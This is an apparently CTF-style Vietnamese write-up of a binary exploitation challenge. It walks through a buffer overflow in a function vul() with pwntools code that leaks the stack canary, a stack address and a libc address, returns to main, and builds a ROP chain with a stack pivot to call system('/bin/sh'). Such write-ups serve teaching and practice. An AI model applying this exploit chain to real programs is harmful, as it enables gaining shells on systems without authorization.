# Phân tích code
 
 <img width="787" height="606" alt="image" src="https://github.com/user-attachments/assets/012c2e18-28cb-41dd-ac5c-4c0b19162389" />

Lỗi buffer overflow nằm trong hàm vul().
Và vòng for chỉ cho phép thực hiện 5 nằm động trước khi ret.

<img width="1127" height="425" alt="image" src="https://github.com/user-attachments/assets/dcabfb1a-dcdf-4a8a-bd9c-f7d6349fa07e" />

Kiểm tra trong stack thì 24 BYTE cuối có thể ghi đè lần lượt là canary, saved_rbp và saved_rip.
Trong stack không có chỗ để chứa ROPchain gọi system nên cần dùng stack pivot để chuyển hướng đến địa chỉ khác chứa ROPchain.
Phù hợp nhất là leak stack (saved_rbp) để tính offset đến buffer và nhập system vào ở hành động sau để thực thực thi.

Nhưng vì có Canary nên cần leak Canary để bypass trước:

    p.sendlineafter(b'>', b'1')
    p.sendafter(b'Please enter some data:\n> ',b'A'*265) // nhập dữ liệu ghi đè byte NULL của canary
    p.sendlineafter(b'>',b'2')
    p.recvuntil(b'A'*265)
    canary=u64(b'\0'+p.recv(7))  // Lấy 7 byte của Canary bỏ đi byte A
    log.info('canary: '+hex(canary))

Tiếp theo là leak địa chỉ stack:

    p.sendlineafter(b'>',b'1')
    p.sendafter(b'Please enter some data:\n> ',b'A'*272)
    p.sendlineafter(b'>', b'2')
    p.recvuntil(b'A'*272)
    leak_rbp=u64(p.recv(6)+b'\x00\x00')
    log.info('leak_rbp: '+hex(leak_rbp))

File binary thiếu đi các gadget cần thiết nên không thể gọi syscall execv. Có NX nên cũng không thể dùng shellcode.

Thay vào đó trong stack đã có sẵn địa chỉ libc có thể được leak.

<img width="1122" height="232" alt="image" src="https://github.com/user-attachments/assets/2eebc3fb-4f76-428b-8357-c908b42152b3" />

Leak Canary và Stack đã tiêu tốn hết 4 hành động (2 lần read và 2 lần write). Chỉ với 1 hành động không thể leak libc lẫn ghi đè payload nên 
giải pháp hiện tại là dùng 1 lần hành động còn lại để gọi địa chỉ quay lại hàm main. 

Ghi đè địa chỉ main() vào saved_rip:

    payload=b'A'*264
    payload+=p64(canary)       //dùng Canary đã leak để bypass
    payload+=p64(0x404088)     // ghi đè một địa chỉ ở rw-section để tránh lỗi
    payload+=p64(exe.sym['main']) 
    p.sendlineafter(b'>',b'1')
    p.sendafter(b'Please enter some data:\n> ',payload)

<img width="1352" height="676" alt="image" src="https://github.com/user-attachments/assets/457448f7-7d9d-4300-97de-36e3db6e4799" />

Vì địa chỉ stack bị lẻ 8 BYTE nên cần chỉnh lại câu lệnh thành:

     payload+=p64(exe.sym['main']+8)

Sau khi đã quay lại hàm main thì leak libc:

    p.sendlineafter(b'>',b'1')
    p.sendafter(b'Please enter some data:\n> ',b'A'*288)
    p.sendlineafter(b'>', b'2')
    p.recvuntil(b' '*8)
    leak_libc=u64(p.recv(6)+b'\x00\x00')
    log.info('leak_libc: '+hex(leak_libc))

Cuối cùng thì nhập payload chứa ROPchain và địa chỉ chuyển hướng stack pivot

    payload=b'A'*8
    payload+=p64(ret)             // thêm ret thì địa chỉ stack bị lẻ 8 BYTE
    payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
    payload+=p64(libc.sym['system'])
    payload=payload.ljust(264,b'A')
    payload+=p64(canary)           //bypass canary
    payload+=p64(leak_rbp-0x120)   // chuyển rsp lên đầu buffer
    payload+=p64(leave)

    input()
    p.sendlineafter(b'>',b'1')
    p.sendafter(b'Please enter some data:\n> ',payload)

<img width="1877" height="952" alt="Screenshot 2026-09-24 153037" src="https://github.com/user-attachments/assets/abcb7781-7c35-4113-bfe0-24a972680651" />
